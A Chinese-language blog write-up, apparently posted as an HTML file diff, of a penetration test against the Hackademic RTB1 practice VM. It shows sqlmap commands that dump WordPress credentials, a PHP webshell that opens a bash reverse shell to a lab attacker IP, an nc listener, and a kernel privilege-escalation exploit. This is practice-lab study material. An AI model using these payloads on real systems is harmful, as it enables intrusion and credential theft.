@@ -1,0 +1,254 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Hackademic.PTR1靶机渗透 | Tubby Little Hero</title><meta name="author" content="Tubby Little Hero"><meta name="copyright" content="Tubby Little Hero"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="靶机渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackademic.PTR1靶机渗透">
+<meta property="og:url" content="https://tubby-little-hero.github.io/2026/02/21/Hackademic.PTR1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="Tubby Little Hero">
+<meta property="og:description" content="靶机渗透">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tubby-little-hero.github.io/img/dao.jpg">
+<meta property="article:published_time" content="2026-02-21T08:18:55.000Z">
+<meta property="article:modified_time" content="2026-03-19T11:02:25.662Z">
+<meta property="article:author" content="Tubby Little Hero">
+<meta property="article:tag" content="web渗透">
+<meta property="article:tag" content="实战">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tubby-little-hero.github.io/img/dao.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Hackademic.PTR1靶机渗透",
+  "url": "https://tubby-little-hero.github.io/2026/02/21/Hackademic.PTR1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/",
+  "image": "https://tubby-little-hero.github.io/img/dao.jpg",
+  "datePublished": "2026-02-21T08:18:55.000Z",
+  "dateModified": "2026-03-19T11:02:25.662Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Tubby Little Hero",
+      "url": "https://tubby-little-hero.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tubby-little-hero.github.io/2026/02/21/Hackademic.PTR1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Hackademic.PTR1靶机渗透',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/leisai.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/mao.png" alt="Logo"><span class="site-name">Tubby Little Hero</span></a><a class="nav-page-title" href="/"><span class="site-name">Hackademic.PTR1靶机渗透</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Hackademic.PTR1靶机渗透</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-21T08:18:55.000Z" title="发表于 2026-02-21 16:18:55">2026-02-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-03-19T11:02:25.662Z" title="更新于 2026-03-19 19:02:25">2026-03-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E6%B8%97%E9%80%8F-%E7%BD%91%E5%AE%89/">web渗透 网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>Hackademic.RTB1靶机渗透测试</p>
+<h2 id="是一个打包好的镜像"><a href="#是一个打包好的镜像" class="headerlink" title="是一个打包好的镜像"></a>是一个打包好的镜像</h2><p>打开虚拟机选择我已移动虚拟机，不然没有网</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="1-1-用-arp-scan-l-扫描网段存活的主机"><a href="#1-1-用-arp-scan-l-扫描网段存活的主机" class="headerlink" title="1.1 用 arp scan -l 扫描网段存活的主机"></a>1.1 用 <code>arp scan -l</code> 扫描网段存活的主机</h3><p>找到目标靶机：<code>192.168.5.140</code></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=YTgwMjIyN2JkYTdkZDljOTgyMjQwNGI3OThmYzJkYmRfV0ZDMlhoaWlHdVRTQWY3ZURmRW5MS09xMXBVM1d1NVNfVG9rZW46UmtWYmJMS2Jhb2lwYnd4U0tZbmNqYXFoblFoXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<h3 id="1-2-用-nmap-扫描开放端口的服务和版本"><a href="#1-2-用-nmap-扫描开放端口的服务和版本" class="headerlink" title="1.2 用 nmap 扫描开放端口的服务和版本"></a>1.2 用 nmap 扫描开放端口的服务和版本</h3><h3 id="1-3-dirb-扫描目录"><a href="#1-3-dirb-扫描目录" class="headerlink" title="1.3 dirb 扫描目录"></a>1.3 dirb 扫描目录</h3><p>用 <code>dirb http//:192.168.5.140/</code>扫描扫不出来什么东西</p>
+<p>要用 <code>dirb http//:192.168.5.140/Hackademic.RTB1</code> 扫描二级目录</p>
+<p><code>http://192.168.5.140/Hackademic_RTB1/wp-admin/</code> 这个目录应该是有用的</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NTZiMTg5MDE4YmJkNjdmODA3MzYxNGMxYmMxZjFlYzNfanN5bVRMbllVSmVxYzZ6SjdpOHR1OElVY043bHJWR0lfVG9rZW46SVV6dmJrT2Zob1J0OWp4U0dCNGNLTlA2bk5nXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="2-1-xmlrpc-目录"><a href="#2-1-xmlrpc-目录" class="headerlink" title="2.1 xmlrpc 目录"></a>2.1 xmlrpc 目录</h3><p>但是页面提示只能 post请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -x POST ``http://192.168.5.140/Hackademic_RTB1``/xmlrpc.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGVmOWY5OTQ2OWI3ZjYwYWQ2YzU2MDExN2VlNjM0NzdfSDI2T1ZUTmtxNVVoY2hOWWFBS253VWQ3MnV1cVVTQXVfVG9rZW46QWxZVmJ4Q1dIb1ZkSVB4ZVU4SWMyOUt5bmxoXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p>用 msfconsole 做进一步的渗透测试</p>
+<p>但是返回的结果显示这个页面没有实际的功能</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=N2RlMzQ5M2U1MjBlOTJjOGE1NzJlN2UwM2MwZjIwNWVfMUxGeWdsbzNxenNFdUI0Y215VEJsaGpDamp3U0hqTG5fVG9rZW46V2ZGMWJJSzlqbzVUeDl4MllBcmM5QlB5bkRmXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<h3 id="2-2-sql-注入（get）"><a href="#2-2-sql-注入（get）" class="headerlink" title="2.2 sql 注入（get）"></a>2.2 sql 注入（get）</h3><p><code>http://192.168.5.140/Hackademic_RTB1/?cat=1</code> 这个页面很明显的有一个<code> ?cat=1</code> 看起来像是 sql注入点 </p>
+<p>我们使用<code>sqlmap</code> 进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.5.140/Hackademic_RTB1/?cat=1``&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=YjA0MjgwODA4OGYwZmVlNzFlZDUwMjZkOGIzNzJlNmRfRWdrWFpON1dPZXVrRm1Da1c3cEtrTWdqaHE2MkR0WFNfVG9rZW46RE9UWWJoZnpzb1p5Rm54Y25qbGN2ajhNblhnXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p>结果显示确实存在 sql 注入</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MWQ5OWVkNGFiOWM3NzZlZTI4NDY0ZmM1MjIyM2I1YmNfOGxlV3M1eXdJOE5XVGRxdjFpejZBWGJKMWRmUURoQnVfVG9rZW46S3JNS2JmQXR0b3Uya3h4V0pNWWNUMUtmbmVlXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p>尝试爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.5.140/Hackademic_RTB1/?cat=1``&quot; -dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MmE0YmZkODJiNWViOTA1ZjgzZmYwYWI1ZTNmODA2YmJfSVVHZEJ2WkpwcXAwcXdDNXpiZHVwNDZGMFZlc1ZncFpfVG9rZW46SURuZmJmOFQxb21oOWl4QmwzMGNadFllbldkXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.5.140/Hackademic_RTB1/?cat=1``&quot;-D wordpress --tables --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=YjA1Y2FlZmQzMTFiM2Q4NzEzMGY4ZjA5OGNiMTMyMWNfRDdMMEpiQjdmcFoxM0dhbUYwR1lpSVdFaW5qWGZLWFdfVG9rZW46WThBTGJzczlRb0tnQ054enlTemNKSWdDbnRlXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=YjA3OGM2NjI3OWI0ODg4YjViNmJiMDA4NTFiMzEyOWZfVWFqdmg1b1VHVVpoYkx2WlBuYUtQSHA4R25JbjFVMGNfVG9rZW46SFRTOGJ4U0Q5bzlVRmN4NTdYUWNBd2VsbmZlXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqLmap -u &quot;``http://192.168.5.140/Hackademic`` RTB1/?cat=1&quot; -C user l0gin,user pass -D wordpress -T wp-users --dump -batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTk0NmFhZTBmOTE1MzZmZDA4YzI3MWFiOWQ1NzBjNGJfbjZiS1Q3RFRlNWVPOHBvMG9wdUZUR1VkREZ1OHprNmxfVG9rZW46UHVUUWJ4Qzhhb0J5TFd4bmRQQWNJMlp5bmJCXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NGI2YmEyMDdjNjc0NjdmMjljZTA4ZWRmYmExNWNhZWVfMklsSmxGYVUyclhHQnhET2kzaFRrbktKWUVPYzgzYXBfVG9rZW46UXQ5VmJaNHJjb1gxSEp4elhuUmNwS2xrbjI5XzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p>获得了所有的用户</p>
+<p>经过尝试之后发现</p>
+<p><code>GeorgeMiLLer:q1w2e3</code> 这个用户的权限最高</p>
+<p>用这个用户登录</p>
+<h3 id="2-3-RCE"><a href="#2-3-RCE" class="headerlink" title="2.3 RCE"></a>2.3 RCE</h3><p>在登录进去的后台里面有一个文件上传的模块可以修改</p>
+<p>我们把允许上传的文件后缀加一个 <code>.php</code></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ODUwNGViOTAzMjE3MTQ1NGRiZTAwMGFlZWM1N2IxNzJfM2xvTXl5RWxmU0xqUFpuMnJVTnV5YnViM2tmTWtrdWhfVG9rZW46R1ZlTGJ1Vm1pb214cW54Y3dBdmNaa21ObkNiXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p>然后上传一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.5.130/4444 0&gt;&amp;1&#x27;&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MGQ0Mjc5MzdiZjRlMzVjMGIxMzM5MzYwNWZiZTY0NmJfV013cWtrc0pGNERPN3ZER3Z3TnBYWGhTOXFGWWdibFRfVG9rZW46UVBXeGJSWEFib1ZIcFd4VkJ5dWNRZGdhbkRoXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=YjE0ZDRlZmVkNDViZTFiODZlYjJmZjNkODZiMjE4NTNfNnJBdDE0c1hNamtBblBBcFNBaFdNODhvSzMxZnkxUTBfVG9rZW46UU10bWIwTDd3b3pYMHJ4ZGhyb2NtV3dobnJoXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p>在上传文件的目录里面找到他</p>
+<p>在kali里面开一个监听</p>
+<p>然后点击运行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+
+<p>成功监听到</p>
+<p>并建立严格的 tty 交互终端</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=OWRiNzM5ZDhjZTA5NDc1OThiNTMzNmUwYWYzN2I5ZTVfQTVjaFV1MHVLbjZ4VzI1R0M5bUZZT2lxN1pzMGdvcmxfVG9rZW46QmxiRWJVU2RLb0FWTUR4elFVVWN4MzFrbjRjXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<h3 id="2-4-内核提权"><a href="#2-4-内核提权" class="headerlink" title="2.4 内核提权"></a>2.4 内核提权</h3><p>用 <code>uname -a</code> 得到内核版本</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NjAxMTExOGIxNjI1NDE0MGVkNTNmMzVmMzNkZWM5MDdfOUZjSEpXbEdXRGJLQkR2VFI4YWI0M2U0R2NjR2FkOVJfVG9rZW46WkZYVWJTY1dqb084dWN4YmFvVWM3anNXbmNlXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p>用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux 2.6.3</span><br></pre></td></tr></table></figure>
+
+<p>搜索可利用的漏洞脚本</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MmE5MjVjZGI1MWQxZjlhMmNhZDM0NmYxZmJkZDU1NDhfMVRaWm1xT3Y5cXdjcndlZ3hyZnBqTW1JVkJIRWFnYzFfVG9rZW46UDdiTmIwVnA2b0dCVHR4cDc3RGNScXdybk1kXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p>经过不断的尝试，最终确定可以利用的脚本</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MGM4Y2ZmODY0OTAyNDk2MzQ4NWQzMGJjMWI2ZTM2NjRfVkpxeWdmZ2ZGdlYzc0R1d0NSZmE1Uk05WGZTR2JDcVVfVG9rZW46Sm9MeWJIazVHb1VMamJ4VXl3QWNTUGdDbm9nXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p>把它扒下来</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">locate linux/local/<span class="number">15285</span>.c</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/<span class="number">15285</span>.c ./</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MjhhNGQ3YzhlMmFmNDZkNDRkODVhZWU4NzBhOGQ1MjdfWERLdnRHd2NuZVRjTWtkNFlBY09sMUZxRnF1N3g0dFBfVG9rZW46R3MyRWJYSWhzb3JMMmJ4cVFCaWNSeTdKbnpRXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p>建立一个 http 服务 把木马传上去</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=OTNiMmVmZTc2ZmYxNzk1MzliYzAwNTE3OTAzMThhNjRfMTgzV29YakNnZWtsRnZCNEdhV0RGNkh1Z2s0MjVGRDVfVG9rZW46TVNRM2IzZW5GbzJWR2Z4MkNSYmNGN1FLbjdjXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NDA3ZDRiMTNlZjEyZjhmYmU2YzViOTQ1ZTU0ZTRhMTNfbmJQMGU0ems4RGFFV0lkVkxEdkZMbmUwcU10RHpCYVNfVG9rZW46SGJpYWJwakNQb3ZqMmZ4VnY4c2NCYklhblRjXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="number">15285</span>.c exp</span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ODQ1ODY3MDY4MjdkYjc1MjhmOTQ5ZDI2YWEzOTlmNTJfYkdCYUdRZVBqZFJJbHVWMXcwQ2liZFNvNTR0RVJYMG1fVG9rZW46R2hYNWJmanFPb1dBSVl4SGRDNmM5ekxBbmhiXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p>&#96;</p>
+<p>成功提权</p>
+<p>完成最后的任务</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MGZkYjZhMWE3MjE1ZWE5OGIwZTI4MGRjNzMwNGIxYzBfSndoUHpYQXRzU2h4ekRmMFhLaEQwNFlFaEx3WGdqVGlfVG9rZW46WEVRa2IwcVpLb0FoV1V4TVNaRmNad1htbnpjXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<h3 id="2-5-xss"><a href="#2-5-xss" class="headerlink" title="2.5 xss"></a>2.5 xss</h3><h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MDI2NTQ1MzI1YWM4ZDQyYzRhMmI3NjRkMTNkZDE2YWJfZGhmNVJrWk1rT1FJVTFjRHljSXA5bHNwTVJzYWpFRUFfVG9rZW46SnVMY2Jtcmhqb2dJd2d4djBuTGNPZTdEbndoXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGMyY2ZmZGFkOTY4YWQwOTE1YzkxY2Q1NjA3ZmU1ZGNfM1g3OGQ1SW5INk96U3Y1MlVuU1l1WHZ5c05nWEI3a3RfVG9rZW46WWVZc2JUNVJhb083OE14TUxxZ2N5eVhLbmljXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<h4 id="存储型xss-1"><a href="#存储型xss-1" class="headerlink" title="存储型xss"></a>存储型xss</h4><p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDA0NWM5NzA0YzMwOWM0ZDQzOTZkMjVmYTQ1ZTkwNGNfV1NLd1d0TG9jM2dma0ZNNFZkeHU0Mmw4RWZBWFFSTGNfVG9rZW46WWZKa2JTdnp5b1VLelR4NHNBaWNLSHJxbmxmXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NzI2ZWRmNzExZjJkZWVhNjg3ZDUzNjQwMjUwM2Y5YTZfOEZTbEw5WWtrS0ZOYXExU1pma3ZqTHJtZ0JOS0kzdUxfVG9rZW46THpNRWJDWmVnb0twRFF4bTJZQmM4YXJVbmxiXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
+<h4 id="存储型xss-2"><a href="#存储型xss-2" class="headerlink" title="存储型xss"></a>存储型xss</h4><p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NDM5MjdiOTBiYzY3ZjZlMTllNGNkOGNkNWU3NTU5NTlfTlExMXRtakNUZGFEbVVmYThkdWlRRmtqMDAyUUFBVU9fVG9rZW46RkxWT2JqT0lsbzFQZkJ4b0syNGNRR2NHbndiXzE3NzM5MTgxMDc6MTc3MzkyMTcwN19WNA" alt="img"></p>
